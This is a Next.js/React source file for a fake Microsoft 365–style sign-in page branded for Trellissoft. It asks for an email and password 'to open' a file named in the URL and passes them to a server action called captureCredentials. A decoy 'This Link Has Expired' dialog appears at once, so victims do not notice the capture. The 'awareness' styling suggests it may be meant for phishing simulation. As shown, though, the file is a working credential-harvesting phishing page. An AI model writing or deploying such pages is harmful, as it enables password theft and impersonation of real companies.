'use client';

import React, { useState, useTransition } from 'react';
import Image from 'next/image';
import { useSearchParams } from 'next/navigation';
import { ShieldX, AlertTriangle } from 'lucide-react';
import { captureCredentials } from '@/app/actions';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from '@/components/ui/alert-dialog';

export default function LoginPage() {
  const [isPending, startTransition] = useTransition();
  const [showSuccessAlert, setShowSuccessAlert] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const searchParams = useSearchParams();
  const fileName = searchParams.get('file') || 'Excel';

  const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    const formData = new FormData(event.currentTarget);
    
    // Immediately show the success alert to the user
    setShowSuccessAlert(true);

    // Start the background submission
    startTransition(async () => {
      try {
        const result = await captureCredentials(null, formData);
        if (!result.success) {
          // Log error or handle it silently in the background
          console.error("Failed to save credentials:", result.message);
          setError(result.message); // Optionally set error for a different dialog
        }
      } catch (e: any) {
        console.error("An unexpected error occurred:", e.message);
        setError("An unexpected error occurred. Please try again.");
      }
    });
  };

  return (
    <>
      <div className="login-card">
        <Image
          src="https://trellissoft.ai/wp-content/uploads/2021/11/Trellissoft-logo-without-tagline.png"
          alt="Trellissoft Logo"
          width={180}
          height={36}
        />
        <h1>{`Sign in to open ${fileName}`}</h1>
        <form onSubmit={handleSubmit} autoComplete="off">
          <input
            type="text"
            name="username"
            placeholder="Email or phone"
            required
            disabled={isPending && showSuccessAlert}
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            required
            disabled={isPending && showSuccessAlert}
          />
          <button type="submit" disabled={isPending && showSuccessAlert}>
            {isPending && showSuccessAlert ? 'Signing in...' : 'Sign in'}
          </button>
        </form>
        <div className="footer">
          <p>This application is created using Microsoft 365 by Trellissoft and may include content controlled by Trellissoft.</p>
          <p>&copy; Microsoft Corporation</p>
        </div>
      </div>

      {/* Success / "Link Expired" Alert Dialog */}
      <AlertDialog open={showSuccessAlert} onOpenChange={setShowSuccessAlert}>
        <AlertDialogContent className="awareness-dialog">
          <AlertDialogHeader>
            <div className="flex justify-center mb-4">
              <Image
                src="https://media.licdn.com/dms/image/D560BAQGj-2L22A-4-Q/company-logo_200_200/0/1712739343993/trellissoft_logo?e=1728518400&v=beta&t=o1n4Gk_1-vJ3s_Yy_J_j_j_j_j_j_j"
                alt="Trellissoft Logo"
                width={180}
                height={60}
                className="object-contain"
                priority
              />
            </div>
            <div className="flex justify-center mb-3">
              <ShieldX className="w-14 h-14 text-red-500" />
            </div>
            <AlertDialogTitle className="text-2xl font-semibold text-center text-white">
              This Link Has Expired
            </AlertDialogTitle>
          </AlertDialogHeader>
          <AlertDialogDescription className="mt-2 text-center text-gray-400 leading-relaxed">
            ⚠️ This link has expired for security reasons. <br />
            Your asset update form is no longer available. <br />
            To protect your information, this link automatically expires after a set time.
            <br /><br />
            Please request a new secure link if you still need to update your details.
            <p className="mt-4 text-sm text-gray-500">
              Always be cautious of unexpected login requests.
            </p>
          </AlertDialogDescription>
          <AlertDialogFooter className="sm:justify-center mt-4">
            <AlertDialogAction
              onClick={() => setShowSuccessAlert(false)}
              className="bg-[#217346] text-white hover:bg-green-800"
            >
              Continue
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* Optional: Error Alert Dialog for background failures */}
      <AlertDialog open={!!error} onOpenChange={() => setError(null)}>
        <AlertDialogContent className="awareness-dialog">
          <AlertDialogHeader>
            <div className="flex justify-center mb-3">
              <AlertTriangle className="w-14 h-14 text-yellow-400" />
            </div>
            <AlertDialogTitle className="text-2xl font-semibold text-center text-white">
              Submission Failed in Background
            </AlertDialogTitle>
          </AlertDialogHeader>
          <AlertDialogDescription className="mt-2 text-center text-gray-400 leading-relaxed">
            {error}
          </AlertDialogDescription>
          <AlertDialogFooter className="sm:justify-center mt-4">
            <AlertDialogAction
              onClick={() => setError(null)}
              className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
            >
              Close
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
}
